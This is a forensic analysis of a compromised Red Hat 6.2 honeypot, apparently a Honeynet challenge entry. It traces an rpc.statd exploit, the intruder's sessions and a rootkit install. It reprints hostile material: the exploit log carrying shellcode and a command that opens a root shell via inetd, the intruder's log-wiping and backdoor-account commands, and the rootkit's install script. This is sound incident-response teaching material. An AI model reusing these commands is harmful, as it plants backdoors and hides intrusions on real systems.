@@ -1,0 +1,587 @@
+FORENSICS ANALYSIS
+
+
+TABLE OF CONTENTS
+-----------------
+
+1.	Introduction
+
+2.	Pre-analysis
+
+3.	Log file analysis
+
+4.	Establishing method of intrusion
+
+5.	Sequence of intruder activities
+
+6.	Identity of intruder
+
+7.	Conclusion
+
+8.	References
+
+
+1. Introduction
+---------------
+We present here our forensics analysis of the compromised system's hardisk
+partitions. Answers to the list of questions posed are marked with "[Q?]".
+References to other files are marked with [?], and listed at the end of this
+file.
+
+The tools used are mainly basic Linux tools, e.g. strings, grep, diff etc, 
+and The Coroner's Toolkit.
+
+
+2. Pre-analysis
+---------------
+At this point, we do not know if the filesystem has been trojanised with a
+rootkit. So we adopted a simple way of getting around any trojanised rootkit
+present to facilitate our forensics analysis: mount the partitions on another
+clean system through the loop device [Q5]. The command we used was:
+
+	# mount honeynet.hda?.dd /mnt/x -o loop,ro,noexec,nodev
+	
+The first thing we did was to collect MACtimes of the filesystem. We used the
+'mactime' tool in The Coroner's Toolkit. This was an important first step
+because MACtimes record _last known_ activities, so they are very sensitive
+to even subtle changes made to the filesystem. Since the suspected intrusion 
+happened sometime around Nov 7, we collected MACtimes starting from Nov 6.
+The output of the program is captured in "mactimes.txt" [1]. 
+
+Note that mactimes.txt contains 2 anormalies: Firstly, all files are with
+respect to /mnt/x, the directory under with the partitions were mounted.
+Secondly, instances of the user "thongsia" should have been "drosen" instead.
+This happened because "thongsia", a user on the host system, shares the same
+(uid,guid) with "drosen".
+
+
+3. Log File Analysis
+--------------------
+For a start, we examined the system log files in the /var/log directory for 
+signs of unusual activities.
+
+/var/log/wtmp records last logged in user, while /var/log/utmp records who is
+currently logged in. They are binary files, and must be viewed with 'last' and
+'who' respectivelly. In this case, both /var/log/wtmp and /var/run/utmp showed
+only 1 log entry: a local root login on Nov 9 10:37, quite some time after the
+suspected intrusion. Furthermore, /var/log/wtmp showed that the user was still
+logged in, and that wtmp began only on Wed Nov 8 22:59:52. Most probably, the
+sysadmin logged in on Nov 9 10:37, realised that something was amiss, and
+immediately switched off the machine without logging out to freeze evidence.
+
+------------------------------------------------------------------------------
+root              tty1                      Thu Nov  9 10:37   still logged in
+
+wtmp begins Thu Nov  9 10:37:37 2000
+------------------------------------------------------------------------------
+root     tty1     Nov  9 10:37
+------------------------------------------------------------------------------
+
+/var/log/lastlog logs last logged-in records of all users, and must be viewed 
+with 'lastlog'. In this case, /var/log/lastlog also showed that only root has
+ever logged in, and that occurred on Nov 9 10:37:37.
+
+------------------------------------------------------------------------------
+Username         Port     From             Latest
+root             tty1                      Thu Nov  9 10:37:37 +0800 2000
+bin                                        **Never logged in**
+daemon                                     **Never logged in**
+adm                                        **Never logged in**
+lp                                         **Never logged in**
+sync                                       **Never logged in**
+shutdown                                   **Never logged in**
+halt                                       **Never logged in**
+mail                                       **Never logged in**
+news                                       **Never logged in**
+uucp                                       **Never logged in**
+operator                                   **Never logged in**
+games                                      **Never logged in**
+ftp                                        **Never logged in**
+gdm                                        **Never logged in**
+nobody                                     **Never logged in**
+------------------------------------------------------------------------------
+
+/var/log/secure logs connection via the tcp-wrappers. It captured 2 telnet 
+connections on Nov 8 00:08:40 from IP address 216.216.74.2. We note the IDS
+also captured similar telnet activities from the same IP address, but on 
+another machine 172.26.1.101. This indicates that some probing activities is
+taking place.
+
+/var/log/boot.log showed that the machine has only been booted once, on
+Nov 5 09:33:40.
+
+/var/log/cron showed an immaculate record of cron job logs at hourly and
+10-minute intervals, up until the last entry at Nov 8 22:10:01. Discounting
+the unlikely possibility that cron died by itself, it would appear that cron
+had been killed deliberately. Since the only recorded login entry was on 
+Nov 9 10:37, this would point to an intrusion.
+
+In short, /var/log/wtmp, /var/run/utmp and /var/log/cron indicated a 
+possible intrusion has likely taken place. Furthermore, the MACtimes of these
+files also indicated that all of them might well have been tempered with to
+hide signs of intrusion.
+
+
+4. Establishing method of intrusion
+-----------------------------------
+From the IDS log, it appears that an rpc-related buffer overflow exploit was
+performed on the victim somewhere around Nov 7 23:11:50. A well-known
+rpc-related vulnerability of a stock Red Hat 6.2 Server is the rpc.statd
+vulnerability. Both CERT and Red Hat had issued advisories [2,3] on this 
+vulnerability. An intruder may remotely exploit this vulnerability to gain 
+root privileges.
+
+According to the CERT advisory, evidence of the rpc.statd exploit occuring can
+be found in syslog, i.e. /var/log/messages. The relevant log entry will look 
+like this:
+
+--------------------------------------------------------------------------------
+Aug XX 17:13:08 victim rpc.statd[410]: SM_MON request for hostname
+containing '/': ^D^D^E^E^F
+^F^G^G08049f10
+bffff754 000028f8 4d5f4d53 72204e4f 65757165 66207473 6820726f 6e74736f
+20656d61 746e6f63 696e6961 2720676e 203a272f
+00000000000000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000000000000000000000000000000000000000000000000bffff7
+0400000000000000000000000000000000000000000000000bffff7050000bffff70600000000000
+00000000000000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000000000000000000000000000000000000000000000000000000
+0000000000000bffff707<90><90><90><90><90><90><90><90><90><90><90><90><90><90><90
+><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90
+><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90>K^<89>v
+
+<83> <8D>^(<83> <89>^<83> <8D>^.<83> <83> <83>#<89>^
+1<83>
+<88>F'<88>F*<83> <88>F<89>F+,
+<89><8D>N<8D>V<80>1<89>@<80>/bin
+/sh -c echo 9704 stream tcp 
+nowait root /bin/sh sh -i >> /etc/inetd.conf;killall -HUP inetd
+--------------------------------------------------------------------------------
+
+/var/log/messages on the filesystem showed no such signture. So we use the 
+'unrm' tool from The Coroner's Toolkit on the /dev/hda7 partition, which 
+housed the /var directory tree, followed by a 'strings' command. We were able 
+to uncover what looked like a deleted /var/log/messages file [4]. In this 
+file, the log entries for the rpc.statd exploit is clearly visible. The time-
+stamp of this log entry is Nov 8 00:09:00. We note that this time is about 18
+minutes different from the IDS's timestamp. It is obvious that this log entry
+was deleted by hand from /var/log/messages. 
+
+--------------------------------------------------------------------------------
+. . .
+Nov  5 10:54:05 apollo modprobe: modprobe: Can't locate module eht0
+Nov  5 10:54:52 apollo inetd[408]: pid 680: exit status 1
+Nov  5 10:55:11 apollo PAM_pwdb[621]: (login) session closed for user root
+Nov  6 03:00:41 apollo ftpd[973]: FTP session closed
+Nov  6 04:02:00 apollo anacron[1003]: Updated timestamp for job `cron.daily' to 2000-11-06
+Nov  7 04:02:00 apollo anacron[1576]: Updated timestamp for job `cron.daily' to 2000-11-07
+Nov  8 00:08:41 apollo inetd[408]: pid 2077: exit status 1
+Nov  8 00:08:41 apollo inetd[408]: pid 2078: exit status 1
+Nov  8 00:09:00 apollo rpc.statd[270]: SM_MON request for hostname containing '/': ^D
+08049f10 bffff754 000028f8 4d5f4d53 72204e4f 65757165 66207473 6820726f 6e74736f 20656d61 746e6f63 696e6961 2720676e 203a272f 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff70400000000000000000000000000000000000000000000000bffff7050000bffff7060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff707
+/bin/sh -c echo 4545 stream tcp nowait root /bin/sh sh -i >> /etc/inetd.conf;killall -HUP inetd
+. . .
+--------------------------------------------------------------------------------
+
+This clearly indicates an intrusion had taken place via the rpc.statd exploit
+from the remote machine 216.216.74.2. We can also establish the time of the 
+intrusion to be Nov 7 23:11:50 (GMT-0600), or Nov 8 00:09:00 victim's time
+[Q1].
+
+
+5. Sequence of intruder activities
+----------------------------------
+The intruder actually entered the server on at least 4 occasions. Below is our
+time-line analysis (victim time) [Q7], based mainly on the MAC times we
+collected [1]:
+
+Nov 8 00:09:00	rpc.statd exploit was carried out from 216.216.74.2. Both
+		the IDS and the recovered syslog [4] captured this event. 
+		Exploit succeeded, granting intruder root privileges.
+
+Nov 8 00:09:00  The Intruder's activity was captured in a bash_history
+		fragment that we recovered from /dev/hda8, before he linked 
+		it to /dev/null. We believe these commands were issued around
+		this time, because later evidence shows that his next entry 
+		at 08:28:41 later the same day was via a telnet session using
+		the "adm1" account he created.
+		
+		Intruder checks uptime, and removes entries in /etc/hosts.deny 
+		(to ensure he can telnet in), and /var/log/wtmp 
+		(to hide his tracks). Killed klogd and syslogd, and deleted 
+		both of them from the /etc/rc.d/init.d directory, so that
+		these will not be started if the machine reboots.
+		Created a superuser account "own" and a normal user account
+		"adm1". 
+
+------------------------------------------------------------------------------
+. . .
+exit
+uptime
+rm -rf /etc/hosts.deny
+touch /etc/hosts.deny
+rm -rf /var/log/wtmp
+touch /var/log/wtmp
+killall -9 klogd
+killall -9 syslogd
+rm -rf /etc/rc.d/init.d/*log*
+echo own:x:0:0::/root:/bin/bash >> /etc/passwd
+echo adm1:x:5000:5000:Tech Admin:/tmp:/bin/bash >> /etc/passwd
+echo own::10865:0:99999:7:-1:-1:134538460 >> /etc/shadow
+echo adm1:Yi2yCGHo0wOwg:10884:0:99999:7:-1:-1:134538412 >> /etc/shadow
+cat /etc/inetd.conf | grep tel
+exit
+------------------------------------------------------------------------------
+
+		We also recovered the deleted /etc/shadow from /dev/hda8 that 
+		clearly shows the "own" and "adm1" accounts:
+
+------------------------------------------------------------------------------
+root:$1$eJ2yI2DF$0cXQKjrEYcYHM/qJu2X6Z/:11266:0:99999:7:-1:-1:134540356
+bin:*:11266:0:99999:7:::
+daemon:*:11266:0:99999:7:::
+adm:*:11266:0:99999:7:::
+lp:*:11266:0:99999:7:::
+sync:*:11266:0:99999:7:::
+shutdown:*:11266:0:99999:7:::
+halt:*:11266:0:99999:7:::
+mail:*:11266:0:99999:7:::
+news:*:11266:0:99999:7:::
+uucp:*:11266:0:99999:7:::
+operator:*:11266:0:99999:7:::
+games:*:11266:0:99999:7:::
+gopher:*:11266:0:99999:7:::
+ftp:*:11266:0:99999:7:::
+nobody:*:11266:0:99999:7:::
+xfs:!!:11266:0:99999:7:::
+named:!!:11266:0:99999:7:::
+postgres:!!:11266:0:99999:7:::
+drosen:$1$X2MTV07B$jKfJisg1QOjpfXouUcg0i0:11266:0:99999:7:-1:-1:134540380
+own::10865:0:99999:7:-1:-1:134538460
+adm1:Yi2yCGHo0wOwg:10884:0:99999:7:-1:-1:134538412
+------------------------------------------------------------------------------
+		
+		Intruder confirmed that telnet service was available in 
+		inet.conf, and exit. This concludes his first session.
+		
+Nov 8 08:28:41	Intruder telnet into the victim from remote host
+		c871553-b.jffsn1.mo.home.com, using the "adm1" account he 
+		created, and 'su' into user "own" to gain superuser 
+		privileges. This can be seen from the ENV settings, and 
+		deleted log entries that was recovered from the swap 
+		partition:
+
+------------------------------------------------------------------------------
+LESSOPEN=|/usr/bin/lesspipe.sh %s
+HISTSIZE=1000
+HOSTNAME=apollo.honeyp.edu
+LOGNAME=adm1
+REMOTEHOST=c871553-b.jffsn1.mo.home.com
+MAIL=/var/spool/mail/adm1
+TERM=vt100
+HOSTTYPE=i386
+PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin
+HOME=/tmp
+INPUTRC=/etc/inputrc
+SHELL=/bin/bash
+USER=adm1
+LANG=en_US
+OSTYPE=Linux
+SHLVL=1
+LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.sh=01;32:*.csh=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tz=01;31:*.rpm=01;31:*.cpio=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.xbm=01;35:*.xpm=01;35:*.png=01;35:*.tif=01;35:
+_=/bin/su
+--------------------
+<86>Nov  8 08:28:41 login: LOGIN ON 0 BY adm1 FROM c871553-b.jffsn1.mo.home.com
+--------------------
+<38>Nov  8 0
+@pwdb[2404]: (su) session opened for user own by adm1(uid=5000)
+------------------------------------------------------------------------------
+
+		The intruder could also have done cleanup ops on /etc/inetd 
+		and /var/log/messages during this period.
+
+Nov 8 08:54:25	named was (re)started.
+
+Nov 8 08:59:52	inetd was (re)started.
+		
+------------------------------------------------------------------------------
+<30>Nov  8 08:54:25 named[2964]: Forwarding source address is [0.0.0.0].1037
+<30>Nov  8 08:54:25 named[2964]: listening on [172.16.1.107].53 (eth0)
+<30>Nov  8 08:54:25 named[2964]: master zone "0.0.127.in-addr.arpa" (IN) loaded (serial 1997022700)
+<28>Nov  8 08:54:25 named[2964]: Zone "0.0.127.in-addr.arpa" (file named.local): No default TTL set using SOA minimum instead
+--------------------
+<28>Nov  8 08:59:52 inetd[408]: pid 2387: exit status 1
+------------------------------------------------------------------------------
+
+		We suspect that the intruder exited the victim shortly after
+		this. He certainly had not installed his rootkit until much
+		later in the same day.
+		
+Nov 8 20:37:37	Meanwhile, sysadmin logged in locally, but did not detect
+		anything amiss.
+
+------------------------------------------------------------------------------
+<85>Nov  8 20:37:37 login: ROOT LOGIN ON tty1
+------------------------------------------------------------------------------
+
+Nov 8 22:10:01-	from /var/log/cron, it appears that cron was stopped 
+      22:20:00	unexpectedly during this time. Sign of intrusion.
+      
+Nov 8 22:25:53	Intruder executed 'uptime', probably to check if machine had
+		been rebooted since his last visit.
+
+Nov 8 22:29:27	Intruder executed ftp, presumably to download rootkit.
+
+Nov 8 22:45:18	Intruder opened another telnet session with the victim,
+		because /etc/hosts.allow, /etc/hosts.deny and /etc/issue.net
+		were accessed.
+
+Nov 8 22:51:53	Rootkit is unpacked in /usr/man/.Ci.
+
+Nov 8 22:52:09	Intruder started rootkit's installation script 
+		/usr/man/.Ci/install [Q5], which we have recovered from 
+		/dev/hda8. Mainly:
+		.bash_history in several key directory were linked to
+		/dev/null. 
+		Trojanised programs and a sniffers were installed.
+		A bunch of rpms [6] were installed.
+		An popular Unix IRC client called 'bx' (BitchX) was installed.
+		An sshd1 backdoor was installed.
+
+------------------------------------------------------------------------------
+.Ci/install....#!/bin/sh
+rm -rf /root/.bash_history
+ln -s /dev/null /root/.bash_history
+rm -rf /.bash_history
+ln -s /dev/null /.bash_history
+rm -rf ~games/.bash_history
+ln -s /dev/null ~games/.bash_history
+rm -rf /tmp/.bash_history
+ln -s /dev/null /tmp/.bash_history
+rm -rf /usr/games/.bash_history
+ln -s /dev/null /usr/games/.bash_history 
+mkdir backup
+cp /bin/ps backup
+cp /usr/bin/top backup
+cp /usr/sbin/syslogd backup
+cp /bin/ls backup
+cp /bin/netstat backup
+cp /sbin/ifconfig backup
+cp /usr/sbin/tcpd backup
+echo "Trojaning in progress"
+./fix /bin/ps ps
+./fix /usr/bin/top top
+./fix /usr/sbin/syslogd syslogd
+./fix /bin/ls ls
+./fix /sbin/ifconfig ifconfig
+./fix /bin/netstat netstat
+./fix /usr/sbin/tcpd tcpd
+./fix /usr/sbin/in.identd in.identd
+
+killall -HUP syslogd
+./addbd
+./snif &
+echo "Sniffer ENABLED"
+echo "running clean and a.sh"
+./clean
+./a.sh
+mv ptyp /dev
+gunzip rpms.tgz;tar -xvf rpms.tar;cd rpms;rpm -Uvh --force *.rpm;cd ..;rm -rf rpms*
+killall -1 lpd
+rm -rf /var/log/wtmp
+cd /var/log
+touch wtmp
+cd /usr/man/.Ci
+rm -rf install addbd
+killall -HUP inetd
+cp bx /bin/
+chmod 755 /bin/bx
+rm /usr/sbin/in.ftpd
+mv in.ftpd /usr/sbin/
+chmod +x /usr/sbin/in.ftpd
+echo "done with installing shit"
+echo "i'll now run whereis sshd"
+echo "if nothing shows up then run ./install-sshd"
+echo "if it's in /usr/local/sbin/sshd then run ./install-sshd"
+echo "if it's in /usr/sbin/sshd then run ./install-sshd1"
+whereis sshd
+echo "after successfully installing sshd, run ./do"
+echo "rootkit installation complete."
+------------------------------------------------------------------------------
+
+		For complete list of changes made to the filesystem [Q3], 
+		details of sniffers and password harvesters installed [Q4],
+		and functions of rootkit programs [Q5], please refer to 
+		"filesystem_changes.txt" [7].
+		
+		During the installation of the rootkit, several important
+		programs and scripts were executed. These are:
+		
+Nov 8 22:52:13	A sniffer called 'snif' was executed (/usr/man/.Ci/snif.pid).
+		Its function is apparent from its 'strings' output. The source
+		seems to be linsniffer.c. This sniffer will log selected tcp 
+		sessions to /usr/man/.Ci/tcp.log, particularly telnet and ftp
+		sessions, so as to capture passwords.
+
+------------------------------------------------------------------------------
+. . .
+cant get SOCK_PACKET socket
+cant get flags
+cant set promiscuous mode
+----- [CAPLEN Exceeded]
+----- [Timed Out]
+----- [RST]
+----- [FIN]
+%s => 
+%s [%d]
+sniff.pid
+eth0
+tcp.log
+cant open log
+rm %s
+Exiting...
+. . .
+linsniffer.c
+. . .
+------------------------------------------------------------------------------
+
+Nov 8 22:52:14	The cleanup script /usr/man/.Ci/clean was executed. This will
+		remove from the system logs references to specified programs
+		and IP addresses.
+
+Nov 8 22:52:15	/usr/man/.Ci/a.sh was executed to remove some daemons.
+
+Nov 8 22:53:13	A line was appended to /etc/rc.d/rc.local to load sshd1 on
+		startup.
+
+Nov 8 22:53:33	sshd1 was executed (/var/run/named.pid). This is both a
+		network backdoor and a ssh password harvester. But the main
+		function is the former, since no one else knows that sshd1 is
+		running on this server. A magic username and password is
+		already strored in /usr/tmp/nap. Its strings output shows the
+		format of this file:
+
+------------------------------------------------------------------------------
+. . .
+/usr/tmp/nap
++-[ User Login ]-------------------- --- --- - -
+| username: %s password: %s hostname: %s
++----------------------------------- ----- --- -- -- -
+. . .
+------------------------------------------------------------------------------
+
+Nov 8 22:54:05	nfslock, and its associated services including rpc.statd, was
+		started. (/var/lock/nfslock)
+
+Nov 8 22:54:25	named was (re)started. (/var/run/named.pid)
+
+Nov 8 22:54:30	The rootkit took a long time to install, but probably
+		completed here.
+
+Nov 8 22:55:47  Intruder used /usr/man/.Ci/addn to add entries into
+		/usr/libexec/awk/addy.awk, which is the config file used by
+		the trojanised netstat. 
+
+Nov 8 22:55:58	User executed /usr/man/.Ci/do to remove the "adm1" and "own" 
+		accounts. These accounts were not needed anymore, since a 
+		backdoor sshd1, with a pre-planted magic username and password
+		stored in /usr/tmp/nap, has been installed.
+
+Nov 8 22:56:02	Used /usr/man/.Ci/snap to delete out entries containing his IP
+		address or hostname from /var/log/messages, /var/log/secure
+		and /var/log/xferlog.
+
+Nov 8 22:56:11	Executed /usr/man/.Ci/rmS. This will delete ssh*, install*
+		wuftpd.rpm and nfs-utils-0.1.9.1-1.i386.rpm from the 
+		/usr/man/.Ci directory.
+
+Nov 8 22:56:25	Executed /bin/bx, the IRC client.
+
+Nov 8 22:57:00	Executed the /usr/man/.Ci/chmod-it script, which sets the
+		access permission of a list of programs to octal 700. The
+		list of programs that affected are found in the script.
+
+Nov 8 22:58:26	su into user drosen, and issued the commands as captured in
+		/home/drosen/.bash_history. Mainly unpacked and installed some
+		packages.
+
+Nov 8 22:58:56	A program was compiled. Possibly eggdrop, an IRC bot. 
+		Fragments of eggdrops's source code can clearly be seen in 
+		the /dev/hda7 partition, using 'unrm' followed by 'strings'
+		(This output is HUGE, so we have not attached it. But this is
+		easily replicated using the commands above.).
+		Unfortunately, we could not find out where this program was 
+		kept after compilation. Might have been kept in /dev, but 
+		deleted shortly after at 22:59:14, because we can see from 
+		mactimes.txt that /bin/rm was called and /dev's mactime was 
+		set at that time.
+		
+Nov 8 23:02:28	Created /usr/tmp/nap, the backdoor password file of the 
+		trojanised sshd1. 
+
+Nov 8 23:02:30	Executed /usr/bin/w and then /binps, maybe to check trojans 
+		were working alright.
+
+Nov 8 23:02:42	Edited /etc/inetd.conf, probably to clean up his tracks, and
+		restarted inetd.
+
+Nov 8 23:03:15	Intruder logged out.
+
+Nov 8 23:53:36	Signs that intruder initiated a ssh1 session with victim's
+		trojanised sshd1. 
+
+Nov 9 10:37:30	Sysadmin logged in locally as root.
+		Mounted CD-ROM.
+
+Nov 9 12:10:01	Around this time, the victim was shut down.
+
+
+6. Identity of intruder
+-----------------------
+We do not have enough information to know the exact identity of the Intruder.
+However, we do know that he has access to at least 2 machines: one machine
+with IP address 216.216.74.2, and one machine with hostname
+c871553-b.jffsn1.mo.home.com. [Q2]
+
+Furthermore, from the config files of the trojanised programs
+/usr/sbin/netstat and /usr/sbin/tcpd, and /usr/man/.Ci/clean, the Intruder
+may also have access to the machines with the following IP addresses:
+65.1.*.*, 216.149.*.*, 63.203.*.*, 209.250.*.*, 216.33.*.*, 63.206.*.*,
+and *.*.209.86.
+
+From the time-windows of his intrusions, we also suspect the Intruder has a 
+day job. Between his 1st and 2nd intrusions, he might have needed some 8 hours
+of sleep. Then between his 2nd and 3rd intrusions, he might have been commited
+to some work. So perhaps he is a working professional.
+
+
+7. Conclusion
+-------------
+The intruder's major activities can be summarised as follows:
+He gained root access to the server through a remote rpc.statd exploit. He
+then installed and run a network sniffer, a network backdoor in the form of
+ssh1d, and also an IRC client bx. Using a rootkit, he installed trojanised
+versions of system programs to prevent these processes from being discovered.
+He probably has the intention to use this compromised server as a launching
+pad to attack other servers. This can be gleamed from the different types of
+scanners and exploit scripts that he still kept in the rootkit directory.
+
+
+8. References
+-------------
+[1]	mactimes.txt
+
+[2]	CERT Advisory CA-2000-17 "rpc.statd Input Validation Problem",
+	http://www.cert.org/advisories/CA-2000-17.html
+
+[3]	Redhat Security Advisory RHSA-2000-043-03, 
+	http://www.redhat.com/support/errata/RHSA-2000-043-03.html
+
+[4]	hda7.unrm.strings_var.log.messages
+
+[5]	hda8.156859.t.txt_bash_history
+
+[6]	rpms.txt
+
+[7]	filesystem_changes.txt
